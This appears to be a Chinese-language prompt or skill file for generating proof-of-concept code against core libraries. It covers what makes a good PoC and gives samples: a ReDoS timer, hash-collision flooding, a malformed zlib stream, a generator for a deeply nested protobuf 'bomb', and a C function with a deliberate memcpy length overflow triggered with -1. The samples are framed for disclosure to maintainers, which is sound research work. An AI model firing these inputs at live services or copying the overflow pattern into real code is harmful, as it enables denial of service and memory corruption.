---
description: 基础库 PoC 生成 — 最小化指数回溯正则、哈希碰撞数据集、畸形 zlib 输入、protobuf 类型混淆触发器
tags: [foundation-lib, PoC, proof-of-concept, redos, hash-collision, zlib, protobuf]
---

# PoC 生成器 (PoC Generator): 锻造可重现之铁证

## 专家的直觉触发器 (Triggers)

一份有效的基础库 PoC 必须具备以下特征：

- **零环境依赖**：除目标库外，不应依赖特定的网络配置、数据库状态或外部服务。理想情况下是一个单文件可编译程序。
- **确定性触发**：给定相同的输入，PoC 应在规定时间内 100%（或已知概率）触发目标行为（崩溃、异常高 CPU、内存泄漏）。
- **最小化体积**：PoC 的输入数据应压缩到理论最小。对于内存破坏，通常只需数十到数百字节。
- **可断言性**：PoC 应包含明确的通过/失败判定。例如："如果进程在 5 秒内退出并产生 SIGSEGV，则漏洞存在"。
- **跨版本适用性**：如果漏洞存在于多个版本，PoC 应能在未修复版本上触发，在修复版本上被安全拒绝。
- **平台透明**：除非漏洞本身是平台相关的，否则 PoC 应在 Linux、macOS、Windows 上表现一致。

## 不可跳过的问题链 (Question Chain)

1. **这个 PoC 的判定条件是什么？** 是进程退出码非零？是 AddressSanitizer 报 `heap-buffer-overflow`？是 CPU 占用超过阈值？
2. **PoC 是否需要特定的编译选项才能暴露漏洞？** 例如，是否需要 `-fsanitize=address,undefined` 来捕获 UAF，还是在无 sanitizer 下也能崩溃？
3. **输入数据能否进一步缩小？** 使用 delta debugging 或手动二分，确认每个字节是否都是触发所必需的。
4. **PoC 是否在修复版本上"安全失败"？** 如果修复版本也崩溃（例如因为 PoC 触发了另一个 bug），则 PoC 的特异性不足。
5. **对于竞争条件类漏洞，PoC 的触发概率是多少？** 是否需要循环 1000 次才能稳定触发？是否可以通过 `taskset` 绑定单核来提高概率？
6. **PoC 的输出是否包含足够的信息供开发者定位 root cause？** 例如，崩溃时的栈回溯、触发点的文件行号、违规内存地址与对象大小的关系。

## 攻击链闭合 (Attack Chain Closure)

**命题**：PoC 是漏洞假设的**物理实现**。它将抽象的逻辑推理（"如果传入 X，则会发生 Y"）转化为可观测的实验现象。

**推理**：
- 在科学方法中，假设必须经过实验验证。在安全研究中，PoC 就是这个实验。
- 一份好的 PoC 不仅证明漏洞存在，还精确界定了漏洞的边界条件：最小触发输入、影响范围、可利用性评估。
- PoC 的最小化过程（minimization）本身就是对漏洞 root cause 的深入理解：每删除一个字节都不触发，说明每个保留的字节都参与了缺陷路径的构造。
- 在供应链安全中，PoC 是说服维护者和下游用户升级的最有力证据。没有 PoC 的漏洞报告容易被标记为"理论上的"而被推迟处理。

**完整 PoC 链示例**：
```
假设: 正则引擎在模式 (a+)+ 上匹配 aaaaaab 时会指数回溯
  → 构造最小模式: (a+)+ (7 字节)
  → 构造毒化文本: aaaaaab (7 字节)
  → 编写计时器: 测量匹配耗时
  → 设定阈值: >1s 为触发（正常情况 <1ms）
  → 编写断言: assert(elapsed > 1.0)
  → 验证修复版本: 如果引擎实现了线性时间保证，assert 应失败（耗时 <1ms）
  → 输出: 完整的单文件 Python/Rust/C 程序，包含模式、文本、计时、断言
```

## 代码示例: 脆弱模式 vs 安全模式

### 1. ReDoS 最小 PoC (Python)

```python
#!/usr/bin/env python3
"""
PoC: CVE-20xx-yyyy - ReDoS in foundation-regex-lib <= 1.2.0
Trigger: Exponential backtracking in nested quantifiers
"""
import re
import sys
import time

def poc(pattern: str = r"(a+)+", poison_len: int = 24):
    poison = "a" * poison_len + "b"
    
    start = time.time()
    try:
        re.compile(pattern).match(poison)
    except Exception as e:
        print(f"UNEXPECTED EXCEPTION: {e}")
        return False
    elapsed = time.time() - start
    
    print(f"Pattern: {pattern}")
    print(f"Input length: {len(poison)}")
    print(f"Elapsed: {elapsed:.3f}s")
    
    # 判定: 正常匹配应在 1ms 内完成
    if elapsed > 1.0:
        print("RESULT: VULNERABLE (ReDoS triggered)")
        return True
    print("RESULT: NOT TRIGGERED")
    return False

if __name__ == "__main__":
    if len(sys.argv) > 1:
        n = int(sys.argv[1])
    else:
        n = 24
    
    triggered = poc(poison_len=n)
    sys.exit(1 if triggered else 0)
```

### 2. 哈希碰撞性能降解 PoC (Go)

```go
package main

import (
    "fmt"
    "time"
)

// 模拟目标库使用的弱哈希表（教学用）
type VulnHashMap struct {
    buckets [][]string
}

func NewVulnHashMap() *VulnHashMap {
    return &VulnHashMap{buckets: make([][]string, 256)}
}

func (m *VulnHashMap) hash(s string) uint8 {
    var h uint8
    for i := 0; i < len(s); i++ {
        h = h*31 + s[i]
    }
    return h
}

func (m *VulnHashMap) Insert(s string) {
    h := m.hash(s)
    m.buckets[h] = append(m.buckets[h], s)
}

func generateCollisionKeys(n int) []string {
    // 构造具有相同弱哈希值的键
    // 由于哈希空间只有 256，大量键必然碰撞
    keys := make([]string, n)
    for i := 0; i < n; i++ {
        keys[i] = fmt.Sprintf("coll_%d", i)
    }
    return keys
}

func main() {
    m := NewVulnHashMap()
    keys := generateCollisionKeys(100000)
    
    start := time.Now()
    for _, k := range keys {
        m.Insert(k)
    }
    elapsed := time.Since(start)
    
    fmt.Printf("Inserted %d keys in %v\n", len(keys), elapsed)
    if elapsed > 100*time.Millisecond {
        fmt.Println("RESULT: VULNERABLE (hash collision degradation)")
    } else {
        fmt.Println("RESULT: Performance acceptable")
    }
}
```

### 3. 畸形 zlib 输入 PoC (C)

```c
/* PoC: Integer overflow in zlib wrapper <= 2.0 */
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <zlib.h>

static const uint8_t MALFORMED_ZLIB[] = {
    0x78, 0x9c,             /* zlib header (CMF=78, FLG=9c) */
    0x00,                   /* BFINAL=0, BTYPE=00 (stored) */
    0xFF, 0xFF,             /* LEN = 65535 */
    0x00, 0x00,             /* NLEN = 0 (故意错配，应为 0x0000 = ~0xFFFF) */
    /* 实际数据只有 4 字节，远小于声明的 LEN */
    0x00, 0x00, 0x00, 0x00
};

int main(void) {
    uint8_t out[1024];
    uLongf out_len = sizeof(out);
    
    int rc = uncompress(out, &out_len,
                        MALFORMED_ZLIB, sizeof(MALFORMED_ZLIB));
    
    if (rc != Z_OK) {
        printf("SAFE: uncompress returned error %d\n", rc);
        return 0;
    }
    
    printf("UNEXPECTED: uncompress succeeded\n");
    return 1;
}
```

### 4. Protobuf 深度炸弹 PoC (Python)

```python
#!/usr/bin/env python3
"""
PoC: Stack exhaustion in protobuf parser via nested messages
Target: foundation-serialization <= 3.1.0
"""
import struct
import sys

def build_varint(value: int) -> bytes:
    """编码 protobuf varint"""
    result = bytearray()
    while value > 0x7f:
        result.append((value & 0x7f) | 0x80)
        value >>= 7
    result.append(value)
    return bytes(result)

def build_nested_message(depth: int, field_num: int = 1) -> bytes:
    """递归构造嵌套 protobuf 消息"""
    if depth == 0:
        return b'\x08\x01'  # varint field 1 = 1
    
    inner = build_nested_message(depth - 1, field_num)
    tag = (field_num << 3) | 2  # wire type 2 = length-delimited
    return build_varint(tag) + build_varint(len(inner)) + inner

def main():
    depth = int(sys.argv[1]) if len(sys.argv) > 1 else 100000
    bomb = build_nested_message(depth)
    with open("nested_bomb.pb", "wb") as f:
        f.write(bomb)
    print(f"Wrote nested_bomb.pb ({len(bomb)} bytes, depth={depth})")
    print("  VULNERABLE: StackOverflow")
    print("  FIXED: Controlled error ('max depth exceeded')")

if __name__ == "__main__":
    main()
```

### 5. FFI 边界崩溃 PoC (Go + C)

**C 侧（被测库）**:
```c
/* vuln_lib.c */
#include <stdint.h>
#include <string.h>
#include <stdio.h>

void process_buffer(const uint8_t* buf, int len) {
    // 脆弱: len 是 int，但内部按 size_t 使用
    printf("Processing %d bytes\n", len);
    if (buf == NULL) {
        printf("NULL buffer\n");
        return;
    }
    // 当 len = -1 时，memcpy 的第三个参数 size_t 转换后极大
    uint8_t local[256];
    memcpy(local, buf, (size_t)len); // CRASH: len=-1 -> SIZE_MAX
}
```

**Go 侧（PoC 触发器）**:
```go
package main

/*
#cgo LDFLAGS: -L. -lvuln
#include <stdint.h>
extern void process_buffer(const uint8_t* buf, int len);
*/
import "C"
import (
    "fmt"
    "os"
    "unsafe"
)

func main() {
    data := []byte{0x41, 0x42, 0x43, 0x44}
    
    // 触发: 传递 -1 作为长度
    maliciousLen := -1
    
    fmt.Printf("Sending buf=%p, len=%d (0x%x)\n", 
               unsafe.Pointer(&data[0]), maliciousLen, maliciousLen)
    
    C.process_buffer((*C.uint8_t)(&data[0]), C.int(maliciousLen))
    
    fmt.Println("If you see this, the library may be fixed.")
    os.Exit(0)
}
```

## 你的任务

写出能让维护这套库的大型社区开发人员为之变色的测试执行文件，以数据断言为刃，将漏洞劈开给天下人看。输出格式：

```
PoC 文件: poc_CVE20xx_yyyy.c
目标版本: foundation-lib <= 1.2.3
编译命令: gcc -fsanitize=address -g poc.c -o poc -lfoundation
运行命令: ./poc < input.bin
期望输出 (漏洞版):
  ==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x...
  READ of size ... at ... thread T0
  #0 0x... in memcpy
  #1 0x... in foundation_parse at parser.c:189
期望输出 (修复版):
  Error: Invalid size parameter (safe rejection)
触发概率: 100% (确定性触发)
```
